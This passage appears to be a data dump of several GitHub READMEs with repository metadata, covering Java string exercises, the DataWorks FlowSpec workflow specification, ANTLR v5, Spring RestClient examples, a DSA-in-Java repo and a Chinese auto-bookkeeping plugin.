#### 2. Count number of vowels, consonants, spaces in String [Click here to see solution](Problems_On_String/VowelConsonantSpaceCount.java)

#### 3. Find the ASCII value of a character [Click here to see solution](Problems_On_String/AsciiValue.java)

#### 4. Remove all vowels from the string [Click here to see solution](Problems_On_String/RemoveVowels.java)

#### 5. Remove spaces from a string [Click here to see solution](Problems_On_String/RemoveSpaces.java)

#### 6. Remove characters from a string except alphabets [Click here to see solution](Problems_On_String/RemoveNonAlphabets.java)

#### 7. Reverse a String [Click here to see solution](Problems_On_String/ReverseString.java)

#### 8. Remove brackets from an algebraic expression [Click here to see solution](Problems_On_String/RemoveBrackets.java)

#### 9. Sum of the numbers in a String [Click here to see solution](Problems_On_String/SumOfNumbers.java)

#### 10. Capitalize first and last character of each word [Click here to see solution](Problems_On_String/CapitalizeWords.java)

#### 11. Calculate frequency of characters in a string [Click here to see solution](Problems_On_String/FrequencyOfCharacters.java)

#### 12. Find Non-repeating characters of a String [Click here to see solution](Problems_On_String/NonRepeatingCharacters.java)

#### 13. Check if two strings are anagram of each other [Click here to see solution](Problems_On_String/AnagramCheck.java)

#### 14. Count common sub-sequence in two strings [Click here to see solution](Problems_On_String/CommonSubsequenceCount.java)

#### 15. Check if two strings match where one string contains wildcard characters [Click here to see solution](Problems_On_String/WildcardMatch.java)

#### 16. Return maximum occurring character in the input string [Click here to see solution](Problems_On_String/MaxOccurringCharacter.java)

#### 17. Remove all duplicates from the input string [Click here to see solution](Problems_On_String/RemoveDuplicates.java)

#### 18. Print all the duplicates in the input string [Click here to see solution](Problems_On_String/PrintDuplicates.java)

#### 19. Remove characters from first string present in the second string [Click here to see solution](Problems_On_String/RemoveCharacters.java)

#### 20. Change every letter with the next lexicographic alphabet in the given string [Click here to see solution](Problems_On_String/NextAlphabet.java)

#### 21. Write a program to find the largest word in a given string [Click here to see solution](Problems_On_String/LargestWord.java)

#### 22. Write a program to sort characters in a string [Click here to see solution](Problems_On_String/SortCharacters.java)

#### 23. Count number of words in a given string [Click here to see solution](Problems_On_String/WordCount.java)

#### 24. Write a program to find a word in a given string which has the highest number of repeated letters [Click here to see solution](Problems_On_String/WordWithRepeatedLetters.java)

#### 25. Change case of each character in a string [Click here to see solution](Problems_On_String/ChangeCase.java)

#### 26. Concatenate one string to another [Click here to see solution](Problems_On_String/ConcatenateStrings.java)

#### 27. Write a program to find a substring within a string. If found display its starting position [Click here to see solution](Problems_On_String/SubString.java)

#### 28. Reverse words in a string [Click here to see solution](Problems_On_String/ReverseWords.java)


## Previously Asked Coding Question


#### 1. A chocolate factory is packing chocolates into the packets. The chocolate packets here represent an array of N number of integer values. The task is to find the empty packets(0) of chocolate and push it to the end of the conveyor belt(array). [Click here to see solution](Previously_Asked_Coding_Question/ChocolateFactory.java)

**Example 1 :**
   N=8 and arr = [4,5,0,1,9,0,5,0].

  There are 3 empty packets in the given set. These 3 empty packets represented as O should be pushed towards the end of the array
  
**Input :**

  8 – Value of N

  [4,5,0,1,9,0,5,0] – Element of arr[O] to arr[N-1],While input each element is separated by newline

**Output:**

  4 5 1 9 5 0 0 0  

**Example 2:**

**Input:**

  6 — Value of N.

  [6,0,1,8,0,2] – Element of arr[0] to arr[N-1], While input each element is separated by newline

**Output:**

  6 1 8 2 0 0




#### 2. Joseph is learning digital logic subject which will be for his next semester. He usually tries to solve unit assignment problems before the lecture. Today he got one tricky question. The problem statement is “A positive integer has been given as an input. Convert decimal value to binary representation. Toggle all bits of it after the most significant bit including the most significant bit. Print the positive integer value after toggling all bits”. [Click here to see solution](Previously_Asked_Coding_Question/Binary_Representation.java)

**Constrains-**

1<=N<=100

**Example 1:**

**Input :**

10 -> Integer

**Output :**

5 -> result- Integer

**Explanation:**

Binary representation of 10 is 1010. After toggling the bits(1010), will get 0101 which represents “5”. Hence output will print “5”.
",0,0,3,
aliyun/dataworks-spec,master,"[![License](https://img.shields.io/badge/license-Apache%202-4EB1BA.svg)](https://www.apache.org/licenses/LICENSE-2.0.html)
![version](https://img.shields.io/badge/version-1.2.0-blue)
[![Java CI with Maven](https://github.com/aliyun/dataworks-spec/actions/workflows/main.yml/badge.svg)](https://github.com/aliyun/dataworks-spec/actions/workflows/main.yml)
[![CN doc](https://img.shields.io/badge/文档-中文版-blue.svg)](./README_zh_CN.md)

# Introduction

* In this project we defined a generic workflow description specification(FlowSpec)
* We developed a FlowSpec based migration tool(MigrationX) to migrate workflow models from different workflow scheduling systems to DataWorks workflow
  model.
* We can use this tool to develop conversion tools for other scheduling system workflow model.

# FlowSpec Field Reference

## CycleWorkflow

CycleWorkflow is the specification of a scheduled workflow that contains task nodes and dependencies

### Fields

| Field Name |                Field Type                 | Required | Description                            |
|:----------:|:-----------------------------------------:|----------|----------------------------------------|
| `version`  |                 `string`                  | Yes      | Version                                |
|   `kind`   |                 `string`                  | Yes      | CycleWorkflow                          |
| `metadata` |          [`Metadata`](#metadata)          | No       | define extra meta data of workflow     |
|   `spec`   | [`CycleWorkflowSpec`](#cycleworkflowspec) | Yes      | specific definition of `CycleWorkflow` |

## ManualWorkflow

ManualWorkflow is the specification of manual triggered workflow consist of task nodes and dependencies

### Fields

| Field Name |                 Field Type                  | Required | Description                             |
|:----------:|:-------------------------------------------:|----------|-----------------------------------------|
| `version`  |                  `string`                   | Yes      | version info                            |
|   `kind`   |                  `string`                   | Yes      | ManualWorkflow                          |
| `metadata` |           [`Metadata`](#metadata)           | No       | define extra meta data of workflow      |
|   `spec`   | [`ManualWorkflowSpec`](#manualworkflowspec) | Yes      | specific definition of `ManualWorkflow` |

## CycleWorkflowSpec

CycleWorkflowSpec the specification of `CycleWorkflow`

### Fields

|     Field Name     |                    Field Type                    | Required | Description                                      |
|:------------------:|:------------------------------------------------:|----------|--------------------------------------------------|
|      `nodes`       |            `Array<`[`Node`](#node)`>`            | Yes      | list of cycle node definition                    |
|    `variables`     |        `Array<`[`Variable`](#variable)`>`        | No       | list of variable definition                      |
|     `scripts`      |          `Array<`[`Script`](#script)`>`          | No       | list of script definition                        |
|     `triggers`     |         `Array<`[`Trigger`](#trigger)`>`         | No       | list of cycle trigger definition                 |
|    `artifacts`     |        `Array<`[`Artifact`](#Artifact)`>`        | No       | list of artifact definition                      |
| `runtimeResources` | `Array<`[`RuntimeResource`](#runtimeresource)`>` | No       | list of runtime resource definition              |
|  `fileResources`   |    `Array<`[`FileResource`](#fileResource)`>`    | No       | list of file resource definition                 |
|    `functions`     |        `Array<`[`Function`](#function)`>`        | No       | list of function definition                      |
|       `flow`       |            `Array<`[`Flow`](#flow)`>`            | No       | list of flow defines node dependent relationship |

## ManualWorkflowSpec

ManualWorkflowSpec is the specification of `ManualWorkflow`

### Fields

|     Field Name     |                    Field Type                    | Required | Description                                      |
|:------------------:|:------------------------------------------------:|----------|--------------------------------------------------|
|      `nodes`       |            `Array<`[`Node`](#node)`>`            | Yes      | list of manual node definition                   |
|    `variables`     |        `Array<`[`Variable`](#variable)`>`        | No       | list of variable definition                      |
|     `scripts`      |          `Array<`[`Script`](#script)`>`          | No       | list of script definition                        |
|    `artifacts`     |        `Array<`[`Artifact`](#Artifact)`>`        | No       | list of artifact definition                      |
| `runtimeResources` | `Array<`[`RuntimeResource`](#runtimeresource)`>` | No       | list of runtime resource definition              |
|  `fileResources`   |    `Array<`[`FileResource`](#fileResource)`>`    | No       | list of file resource definition                 |
|    `functions`     |        `Array<`[`Function`](#function)`>`        | No       | list of function definition                      |
|       `flow`       |            `Array<`[`Flow`](#flow)`>`            | No       | list of flow defines node dependent relationship |

## Metadata

Defines extra metadata of resource

### Fields

|  Field Name   | Field Type | Required | Description         |
|:-------------:|:----------:|----------|---------------------|
|    `owner`    |  `string`  | No       | owner of spec       |
| `description` |  `string`  | No       | description of spec |

## Node

Node is the definition of workflow node.

### Fields

|    Field Name     |                 Field Type                 | Required | Description                                                                                         |
|:-----------------:|:------------------------------------------:|----------|-----------------------------------------------------------------------------------------------------|
|       `id`        |                   String                   | Yes      | node local identifier in spec                                                                       |                     
|      `name`       |                   String                   | Yes      | node name                                                                                           |                     
|     `script`      |            [`Script`](#script)             | Yes      | referred script define or reference of the node                                                     |                     
|    `functions`    |     `Array<`[`Function`](#function)`>`     | No       | referred functions define or reference of the node                                                  |
|  `fileResources`  | `Array<`[`FileResource`](#fileResource)`>` | No       | referred file resources define or reference of the node                                             |                         
|     `inputs`      |            [`Inputs`](#inputs)             | No       | inputs of the node. `TableArtifact`, `NodeArtifcat`, `Variable` can be used as inputs of `Node`     |
|     `outputs`     |           [`Outputs`](#outputs)            | No       | outputs of the node. `TableArtifact`, `NodeArtifcat`, `Variable` can be used as outputs of `Node`   |
| `runtimeResource` |   [`RuntimeResource`](#runtimeResource)    | No       | runtime resource define or reference of the node                                                    |
|   `recurrence`    |                   string                   | No       | `recurrence` defines cycle schedule state of node, see enumerated values: [Recurrence](#recurrence) |
|    `priority`     |                  integer                   | No       | priority of the node, the larger the value, the higher the priority                                 |
|     `timeout`     |                  integer                   | No       | timeout in seconds of the node, node instance will be killed when timed out after specified seconds |
|  `instanceMode`   |                   string                   | No       | instance mode of the node, see enumerated values [InstanceMode](#instancemode)                      |
|    `rerunMode`    |                   string                   | No       | the rerun strategy of the node instance, see enumerated values [RerunMode](#rerunmode)              |

## Flow

The `flow` section of spec defines dependencies of related workflow nodes.

### Fields

| Field Name |               Field Type               | Required | Description                                      |
|:----------:|:--------------------------------------:|----------|--------------------------------------------------|
|  `nodeId`  |                `string`                | Yes      | node identifier of specific node defined in spec |
| `depends`  | `Array<`[`FlowDepend`](#flowDepend)`>` | Yes      | list of nodes depended by the node               |

## FlowDepend

`FlowDepend` define the dependency or relationship between workflow nodes.

| Field Name | Field Type | Required | Description                                                                          |
|:----------:|:----------:|----------|--------------------------------------------------------------------------------------|
|  `nodeId`  |  `string`  | Yes      | node identifier of specific node defined in spec                                     |
|   `type`   |  `string`  | Yes      | dependency type of the node, see enumerated values [DependencyType](#dependencyType) |

## Variable

`Variable` defines variables of workflow. Variables can be used in workflow nodes.

### Fields

| Field Name | Field Type | Required | Description                                                           |
|:----------:|:----------:|----------|-----------------------------------------------------------------------|
|    `id`    |  `string`  | Yes      | local identifier in spec                                              |
|   `name`   |  `string`  | Yes      | variable name                                                         |
|  `scope`   |  `string`  | Yes      | variable scope, see enumerated values [VariableScope](#variableScope) |
|   `type`   |  `string`  | Yes      | variable type, see enumerated values [VariableType](#variableType)    |
|  `value`   |  `string`  | Yes      | variable value expression                                             |

## Script

`Script` defines script source file resources. Scripts can be used in workflow by nodes, functions or resources.

### Fields

|  Field Name  |             Field Type             | Required | Description                                  |
|:------------:|:----------------------------------:|----------|----------------------------------------------|
|     `id`     |              `string`              | Yes      | local identifier in spec                     |
|    `path`    |              `string`              | Yes      | script path                                  |
|  `language`  |              `string`              | No       | script language                              |
|  `runtime`   |        [Runtime](#runtime)         | Yes      | runtime definition of script                 |
| `parameters` | `Array<`[`Variable`](#variable)`>` | No       | list of parameter definitions used by script |

## Trigger

`Trigger` defines the rules of firing time of scheduled nodes.

### Fields

| Field Name  | Field Type | Required | Description                                                                                                     |
|:-----------:|:----------:|----------|-----------------------------------------------------------------------------------------------------------------|
|    `id`     |  `string`  | Yes      | local identifier in spec                                                                                        |
|   `type`    |  `string`  | Yes      | trigger type, values: `Scheduler`, `Manual`                                                                     |
|   `cron`    |  `string`  | No       | cron expression of `Scheudler` Trigger                                                                          | 
| `startTime` |  `string`  | No       | start effect time of `Scheduler` Trigger. nodes will only instanced time in range from `startTime` to `endTime` | 
|  `endTime`  |  `string`  | No       | end of effect time of `Scheduler` Trigger.                                                                      |
| `timezone`  |  `string`  | No       | timezone of the `Scheduler` Trigger                                                                             |

## Artifact

Artifacts can be types like `NodeOutput`, `Table`, `Variable`. `Variable` can be a context variable produced by workflow nodes.

### Table

| Field Name | Field Type | Required | Description         |
|:----------:|:----------:|----------|---------------------|
|   `guid`   |  `string`  | Yes      | table artifact guid |

### NodeOutput

| Field Name | Field Type | Required | Description                      |
|:----------:|:----------:|----------|----------------------------------|
|  `output`  |  `string`  | Yes      | output string identifier of node |

## RuntimeResource

`RuntimeResource` defines runtime resources config are used to run workflow nodes runtime resources, like: resource group, YARN cluster etc.

### Fields

|   Field Name    | Field Type | Required | Description                      |
|:---------------:|:----------:|----------|----------------------------------|
|      `id`       |  `string`  | Yes      | local identifier in spec         |
| `resourceGroup` |  `string`  | Yes      | resource group global identifier |

## FileResource

`FileResource` defines the resource files used by workflow nodes. like jar, python, text file, archive files etc.

### Fields

| Field Name |    Field Type     | Required | Description                 |
|:----------:|:-----------------:|----------|-----------------------------|
|    `id`    |     `string`      | Yes      | local identifier in spec    |
|   `name`   |     `string`      | Yes      | resource file name          |
|  `script`  | [Script](#script) | Yes      | resource file script define |

## Function

User-Define-Function definition that used by workflow nodes.

### Fields

|   Field Name    |                 Field Type                 | Required | Description                    |
|:---------------:|:------------------------------------------:|----------|--------------------------------|
|      `id`       |                  `string`                  | Yes      | local identifier in spec       |
|     `name`      |                  `string`                  | Yes      | name of udf                    |
|    `script`     |             [Script](#script)              | Yes      | script file of udf             |
| `fileResources` | `Array<`[`FileResource`](#fileResource)`>` | No       | list of related file resources |

## Runtime

`Runtime` define the runtime environment of script. like command, runtime engine, image etc.

### Fields

| Field Name | Field Type | Required | Description                                                |
|:----------:|:----------:|----------|------------------------------------------------------------|
|  `engine`  |  `string`  | No       | runtime engine                                             |
| `command`  |  `string`  | No       | command identifier of script runtime execution environment |

## Outputs

Outputs hold parameters, artifacts, and results from a workflow node, `Outputs` can be consumed by another workflow node.

### Fields

|  Field Name   |               Field Type               | Required | Description                                                                           |
|:-------------:|:--------------------------------------:|----------|---------------------------------------------------------------------------------------|
|   `tables`    |      `Array<`[`Table`](#table)`>`      | No       | `tables` are list of artifact tables produced by node                                 |
|  `variables`  |   `Array<`[`Variable`](#variable)`>`   | No       | `variables` are list of `Variable` produced by node                                   |
| `nodeOutputs` | `Array<`[`NodeOutput`](#nodeOutput)`>` | No       | `nodeOutputs` are list of pre-defined node output identifier strings produced by node |

## Inputs

Inputs are the mechanism for passing parameters, artifacts, volumes from one workflow node to another

### Fields

|  Field Name   |              Field Type              | Required | Description                                                                            |
|:-------------:|:------------------------------------:|----------|----------------------------------------------------------------------------------------|
|   `tables`    |   `Array<`[`Artifact`](#table)`>`    | No       | `tables` are a list of artifact tables passed as inputs                                |
|  `variables`  |  `Array<`[`Variable`](#variable)`>`  | No       | `variables` are a list of `Variable` passed as inputs                                  |
| `nodeOutputs` | `Array<`[`Artifact`](#nodeOutput)`>` | No       | `nodeOutputs` are a list of pre-defined node output identifier string passed as inputs |

## Enumerations

### VariableScope

|   Enum Name   | Description                                                                                    |
|:-------------:|------------------------------------------------------------------------------------------------|
| NodeParameter | `NodeParameter` means the variable is avaliable in a specific node                             |
|  NodeContext  | `NodeContext` means the variable is avaliable in downstream nodes that depends on current node |
|   Workflow    | `Workflow` means the variable is avaliable in all nodes that in current workflow               |
|   Workspace   | `Workspace` means the variable is avaliable in all nodes that in current workspace             |
|    Tenant     | `Tenant` means the variable is avaliable in all nodes that in current tenant workspaces        |

### VariableType

| Enum Name | Description                                                                  |
|:---------:|------------------------------------------------------------------------------|
|  System   | `System` means the variable is avaliable a system variable like: `$yyyymmdd` |
| Constant  | `Constant` means the variable is constant value                              |

### DependencyType

|          Enum Name           | Description                                                                                                                                             |
|:----------------------------:|---------------------------------------------------------------------------------------------------------------------------------------------------------|
|            Normal            | `Normal` means the node instance of current cycle instance depends on the specific node instance in the same cycle round                                |
|   CrossCycleDependsOnSelf    | `CrossCycleDependsOnSelf` means the current cycle instance of the node depends on the previous cycle round instance of the node itself                  |
| CrossCycleDependsOnChildren  | `CrossCycleDependsOnChildren` means the current cycle instance of the node depends on the children instance of itself in the previous cycle round       |
| CrossCycleDependsOnOtherNode | `CrossCycleDependsOnOtherNode` means the current cycle instance of the node depends on the specific node instance of itself in the previous cycle round |

### Recurrence

| Enum Name | Description                                                                                                         |
|:---------:|---------------------------------------------------------------------------------------------------------------------|
|  Normal   | `Normal` means node instance code will be executed as defined repeat cycle, node will be instanced by defined cycle |
|   Skip    | `Skip` means node instance will be set success without any code effects, node will be instanced by defined cycle    |
|   Pause   | `Pause` means node instance will be set failure without any code effects, node will be instanced by defined cycle   |

### RerunMode

|   Enum Name    | Description                                                         |
|:--------------:|---------------------------------------------------------------------|
|    Allowed     | `Allowed` means node instance can be rerun without any precondition |
|     Denied     | `Denied` means node instance cannot be rerun on any condition       |
| FailureAllowed | `FailureAllowed` means node instance can be rerun on failure state  |

### InstanceMode

|  Enum Name  | Description                                                              |
|:-----------:|--------------------------------------------------------------------------|
|     T+1     | `T+1` means node modification will be applied effect on the next day     |
| Immediately | `Immediately` means node modification will be applied effect immediately |    

# FlowSpec Examples

FlowSpec can be used to describe a workflow, it is a json file that contains a list of nodes.

## real case

### EMR/CDH case

* EMR: [yaml](./spec/src/main/spec/examples/yaml/emr.yaml) [json](./spec/src/main/spec/examples/json/emr.json)
* CDH: [yaml](./spec/src/main/spec/examples/yaml/cdh.yaml) [json](./spec/src/main/spec/examples/json/cdh.json)

### example without id variables references

* [yaml](./spec/src/main/spec/examples/yaml/real_case_expanded.yaml)
* [json](./spec/src/main/spec/examples/json/real_case_expanded.json)

### example with id variables references

* [yaml](./spec/src/main/spec/examples/yaml/real_case.yaml)
* [json](./spec/src/main/spec/examples/json/real_case.json)

## simple example

* [yaml](./spec/src/main/spec/examples/yaml/simple.yaml)
* [json](./spec/src/main/spec/examples/json/simple.json)

## branch node

* [yaml](./spec/src/main/spec/examples/yaml/branch.yaml)
* [json](./spec/src/main/spec/examples/json/branch.json)

## join node

* [yaml](./spec/src/main/spec/examples/yaml/join.yaml)
* [json](./spec/src/main/spec/examples/json/join.json)

## for-each/do-while node

* [yaml](./spec/src/main/spec/examples/yaml/innerflow.yaml)
* [json](./spec/src/main/spec/examples/json/innerflow.json)

## manual workflow

* [yaml](./spec/src/main/spec/examples/yaml/manual_flow.yaml)
* [json](./spec/src/main/spec/examples/json/manual_flow.json)

## emr nodes

* [yaml](./spec/src/main/spec/examples/yaml/script_runtime_template.yaml)
* [json](./spec/src/main/spec/examples/json/script_runtime_template.json)

## resource example

* [yaml](./spec/src/main/spec/examples/yaml/file_resource.yaml)
* [json](./spec/src/main/spec/examples/json/file_resource.json)

## function example

* [yaml](./spec/src/main/spec/examples/yaml/function.yaml)
* [json](./spec/src/main/spec/examples/json/function.json)

## param-hub node

* [yaml](./spec/src/main/spec/examples/yaml/parameter_node.yaml)
* [json](./spec/src/main/spec/examples/json/parameter_node.json)

# FlowSpec example

## DataWorks migration assistant spec package demo

* the directory structure of the spec package is consistent with the directory tree of the DataWorks DataStudio business process interface
* *.sql, *.sh, *.hql are user script source files
* *.flow is the spec file corresponding to the user script source file

```shell
➜  project_c_dw tree
.
└── Business Flow
    ├── project_c_dag_3zq3ei4d6
    │   └── ClickHouse
    │       └── Data Analytics
    │           ├── clickhouse_sql_1.flow
    │           └── clickhouse_sql_1.sql
    └── project_c_demo_workflow_1
        ├── EMR
        │   └── Data Analytics
        │       ├── demo_hive_sql_1.flow
        │       ├── demo_hive_sql_1.hql
        │       ├── demo_pg_sql_1.flow
        │       ├── demo_pg_sql_1.hql
        │       ├── demo_shell_1.flow
        │       ├── demo_shell_1.sh
        │       ├── demo_sql_1.flow
        │       └── demo_sql_1.hql
        └── General
            ├── dep_ck_1
            └── dep_ck_1.flow
```

![DataWorks Migration Package FlowSpec example](docs/images/spec/dw_spec_package_demo-en.jpg)

# FlowSpec Client Tool

MigrationX is a workflow model transformation tool based on FlowSpec.

* [MigrationX](docs/migrationx/index.md)
    * Dolphinscheduler migrate to Dataworks DataStudio in one-click command run
    * Dolphinscheduler export command tool
    * Conversion dolphinscheduler workflow to DataWorks FlowSpec
    * Import FlowSpec package to DataWorks DataStudio with DataWorks OpenAPI

## Architecture

![image](docs/images/architecture-en.jpg)

### Domain Model

Define domain model for different workflow engine, containing domain entities and corresponding operation service

### Reader

Implementations of export reader tools for specific workflow engine.

### Transformer

Implementations of transformation logics between specific workflow engines.

### Writer

Implementations of import writer tools for specific workflow engine.

### Usage

[Usage](docs/migrationx/usage.md)

# Modules

* migrationx-common: common module
* migrationx-domain: domain model of specific workflow engine
* migrationx-reader: export reader implementation of specific workflow engine
* migrationx-transformer: transformer implementation of specific workflow engine
* migrationx-writer: import write implementation of specific workflow engine

# Develop guide

[Develop guide](docs/dev/develop-guide.md)

# Contributors

* Alibaba Cloud-DataWorks-Develop & Modeling & Analytics Team
",0,2,21,Apache-2.0
antlr/antlr5,dev,"# ANTLR v5

[![Java 21+](https://img.shields.io/badge/java-21+-4c7e9f.svg)](https://jdk.java.net)
[![License](https://img.shields.io/badge/license-BSD-blue.svg)](https://raw.githubusercontent.com/antlr/antlr5/master/LICENSE.txt)

**ANTLR** (ANother Tool for Language Recognition) is a powerful parser generator for reading, processing, executing, or translating structured text or binary files. It's widely used to build languages, tools, and frameworks. From a grammar, ANTLR generates a parser that can build parse trees and also generates a listener interface (or visitor) that makes it easy to respond to the recognition of phrases of interest.

_This is a new version of ANTLR, in an early development stage_. _If you are looking for a production ready version look into [ANTLR v4](http://antlr4.org/)_.

**Dev branch build status**

[![MacOSX, Windows, Linux](https://github.com/antlr/antlr5/actions/workflows/hosted.yml/badge.svg)](https://github.com/antlr/antlr5/actions/workflows/hosted.yml) (github actions)

## v5 vs v4

ANTLR 4 supports 10 target languages, and each of them requires a dedicated full runtime.
With the advent of [WebAssembly](https://webassembly.org), there is an opportunity to have just 1 runtime, that will run faster with language hosts such as JavaScript or Python.
ANTLR 5 is primarily about that: switching to WebAssembly.
On top of that will come various improvements, currently being specified.

WebAssembly is still being bleeding edge, and the 1st version of ANTLR5 will only support TypeScript.
As other platforms provide support for recent WebAssembly features, such as garbage collection and exception handling, ANTLR5 will rapidly become available for these platforms.

## Repo branch structure

The default branch for this repo is [`main`](https://github.com/antlr/antlr5/tree/main), which is the latest stable release and has tags for the various releases.  Branch [`dev`](https://github.com/antlr/antlr5/tree/dev) is where development occurs between releases and all pull requests should be derived from that branch. The `dev` branch is merged back into `main` to cut a release and the release state is tagged (e.g., with `5.1-rc1` or `5.1`.) Visually our process looks roughly like this:

<img src=""doc/images/new-antlr-branches.png"" width=""500"">

## Authors and major contributors
We're only providing here the list of ANTLR 5 contributors. ANTLR 5 is largely based on ANTLR 4. See [ANTLR 4](https://github.com/antlr/antlr4) for the list of ANTLR 4 contributors, and they are recognized as silent ANTLR 5 authors.

* [Terence Parr](http://www.cs.usfca.edu/~parrt/), parrt@cs.usfca.edu
ANTLR project lead and supreme dictator for life
* [Eric Vergnaud](https://github.com/ericvergnaud) ANTLR 5 project lead
* [Ivan Kochurkin](https://github.com/KvanTTT) major contributor
* [Ken Domino](https://github.com/kaby76) major contributor
* [Jim Idle](https://github.com/jimidle) major contributor
* [Federico Tomassetti](https://github.com/ftomassetti) major contributor

## Useful information

* [Release notes](https://github.com/antlr/antlr5/releases)
* [Getting started with v5](https://github.com/antlr/antlr5/blob/main/doc/getting-started.md)
* [Official site](http://www.antlr.org/)
* [Documentation](https://github.com/antlr/antlr5/blob/main/doc/index.md)
* [FAQ](https://github.com/antlr/antlr5/blob/main/doc/faq/index.md)
* [ANTLR code generation targets](https://github.com/antlr/antlr5/blob/main/doc/targets.md)<br>(Currently: TypeScript)
* _Note: As WebAssembly support grows, we will expand to other mainstream languages. That said, ANTLR 5 architecture supports code generation targets as add-ons, making it easier for anyone in need to support other languages without having to implement the runtime itself._
* [v4 to v5 Migration, differences](https://github.com/antlr/antlr5/blob/main/doc/faq/general.md)

You might also find the following pages useful, particularly if you want to mess around with the various target languages.
 
* [How to build ANTLR itself](https://github.com/antlr/antlr5/blob/main/doc/building-antlr.md)
* [How we create and deploy an ANTLR release](https://github.com/antlr/antlr5/blob/main/doc/releasing-antlr.md)

## The Definitive ANTLR 4 Reference

_Given the fact that work on ANTLR 5 is at a very early stage, there is currently no material about ANTLR 5. However ANTLR 5 is based on the amazing work done in ANTLR 4, and it follows many of the ideas introduced by ANTLR 4. For this reason it makes sense to study the existing material on ANTLR 4._

Programmers run into parsing problems all the time. Whether it’s a data format like JSON, a network protocol like SMTP, a server configuration file for Apache, a PostScript/PDF file, or a simple spreadsheet macro language—ANTLR v4 and this book will demystify the process. ANTLR v4 has been rewritten from scratch to make it easier than ever to build parsers and the language applications built on top. This completely rewritten new edition of the bestselling Definitive ANTLR Reference shows you how to take advantage of these new features.

You can buy the book [The Definitive ANTLR 4 Reference](http://amzn.com/dp/1934356999) at amazon or an [electronic version at the publisher's site](https://pragprog.com/book/tpantlr2/the-definitive-antlr-4-reference).

You will find the [Book source code](http://pragprog.com/titles/tpantlr2/source_code) useful.

## Additional grammars

As of now, there is no collection of grammars for ANTLR 5, but we plan to grow such collection in [grammars-v5](https://github.com/antlr/grammars-v5), which is currently empty.

Until we get grammars for ANTLR 5, you can take a look at [this repository](https://github.com/antlr/grammars-v4); it is a collection of grammars verified for ANTLR 4 where the root directory name is the all-lowercase name of the language parsed by the grammar. For example, java, cpp, csharp, c, etc...
",0,12,5,BSD-3-Clause
danvega/rest-client-examples,main,"# Rest Client Examples

This is a collection of examples using the new `RestClient` in Spring Framework 6.1 & Spring Boot 3.2. 

These are the topics that I would like to cover in this series:

- `RestClient` Instance (org.springframework.web.client) ✅
  - static factory methods
  - DefaultRestClientBuilder
- CRUD
    - List
    - Read
    - Persist
    - Query Params
- Testing with `@RestClientTest` ✅
- HTTP Interfaces
- Switching Http Client Libraries ✅
- Multipart Data
- Jackson JSON Views
- Error Handling
- Interceptors
- Retry (Interceptor)
- Proxy (SimpleClientHttpRequestFactory)
- Spring Cloud MVC
- Resilience
- Live Template ✅

## RestClient Instance

[X Tutorial](https://twitter.com/therealdanvega/status/1750539660886004093)

## Client Request Factories

The `RestClient` uses an underlying Http Client to make calls over HTTP. If you want to read more about this you can check
out the [Spring Documentation](https://docs.spring.io/spring-framework/reference/integration/rest-clients.html#rest-request-factories). The 
following video is a walkthrough of how to do that. The code for this is located in `/src/main/resources/dev/danvega/rc/client/JdkClient.java`

[YouTube Tutorial](https://youtu.be/9M0NggD6Mbw)


## Testing with @RestClientTest

You can test your `RestClient` code using the `@RestClientTest` annotation. 

[YouTube Tutorial](https://youtu.be/jhhi03AIin4)

**Note**

If you run into an issue writing tests with `@RestClientTest` and you're using the JDK Http Client you might be running
into this https://github.com/spring-projects/spring-boot/issues/38832 


## Live Templates

[X Tutorial](https://twitter.com/therealdanvega/status/1750560170785054887)",0,1,1,
Lord-of-Algorithms/DSA-in-Java,main,"# DSA in Java
This repository supplements a mobile app on algorithm and data structure visualization, providing code for the concepts demonstrated in the app. It's an essential resource for users seeking to understand and explore these implementations in detail.

## Contributing

While this project is open-source, it is not currently seeking contributions. You are welcome to fork and use the code according to the license, but please note that contributions or pull requests to this repository will not be accepted.

## Installation and Setup

To clone and run these examples locally, follow these steps:

```
git clone https://github.com/Lord-of-Algorithms/DSA-in-Java.git
```

## Usage

To run an example, navigate to the corresponding file and execute it using your Java environment:

```
cd DSA-in-Java/src/binarytree
javac BinarySearchTreeMain.java
java BinarySearchTreeMain.java
```

## License

This project is licensed under the MIT License. See the LICENSE file for more details.

## About the Mobile App

This repository is a supplement to our mobile app ""Algorithms and Data Structures"", which offers interactive visualizations of algorithms and data structures. Learn more about the app: [App Store](https://apps.apple.com/us/app/algorithms-data-structures/id1484525469), [Google Play](https://play.google.com/store/apps/details?id=com.iov.lordofalgorithms).
",0,0,1,MIT
AutoAccountingOrg/Qianji_auto,dev,"
<p align=""center"">
<img src=""https://cdn.jsdelivr.net/gh/dreamncn/picBed@master/uPic/2022_01_02_21_04_42_1641128682_1641128682216_WVHsgT.png"" width=120 style=""text-align:center"">
 <h1 align=""center"">自动记账</h1>
 <h3 align=""center"">🚀一款基于Xposed和无障碍的记账插件</h3>
<p align=""center"">
<img src=""https://img.shields.io/static/v1?label=framework&message=Xposed%2F%E6%97%A0%E9%9A%9C%E7%A2%8D&color=success&style=for-the-badge""/>
 <img src=""https://img.shields.io/static/v1?label=licenes&message=GPL3.0&color=important&style=for-the-badge""/>
 <img src=""https://img.shields.io/github/stars/dreamncn/Qianji_auto.svg?style=for-the-badge""/>
 <img src=""https://img.shields.io/static/v1?label=download&message=44K&color=9cf&style=for-the-badge""/>
</p>
</p>


> 缘起
> 
> 资本在行动，他们用消费主义四处撒网，少年们纷纷卷入陷阱之中，原本富足的少年开始慢慢变穷。
> 
> 少年们很费解，为什么赚的钱越来越多，生活却越来越拮据。
> 
> 少年们找到了阅历丰富的老人，老人告诉他们：你们要学会理财。**理财？**
> 
> 哦！那可真是个大难题。
> 
> 可少年们还是行动了，年轻人总是那么的勇敢。
> 
> 想要理财，首先得弄清每一笔财富的去向。
> 
> 于是，少年们找到了记账软件：[钱迹](https://www.coolapk.com/apk/com.mutangtech.qianji)
> 
> 它是一款好软件。
> 
> 但，记录那些琐碎而零散的消费，会耗费大量的精力。这对于疲惫不堪的少年们来说，简直就是灾难。
> 
> 如果这些工作由机器来完成，那该多好啊！
> 
> 仿佛听到了群山中少年们的呼唤，光芒自迷雾中降生，**自动记账**——他来了！
> 
> 他，是你账单的守护者，记录你的每一笔收支。
> 
> 他，是支付与记账的桥梁，随付随到，从不缺席。
> 
> 无需苦思冥想，无需左右切换，只需在付款后轻轻一点，即可完成记账。
> 
> **自动记账：** 一款真正人性化的插件。


 注意 

 1、自动记账是一款辅助记账软件，基于[钱迹](https://www.coolapk.com/apk/com.mutangtech.qianji)自动记账接口开发。因此本插件需搭配[钱迹](https://www.coolapk.com/apk/com.mutangtech.qianji)App使用。<br/>

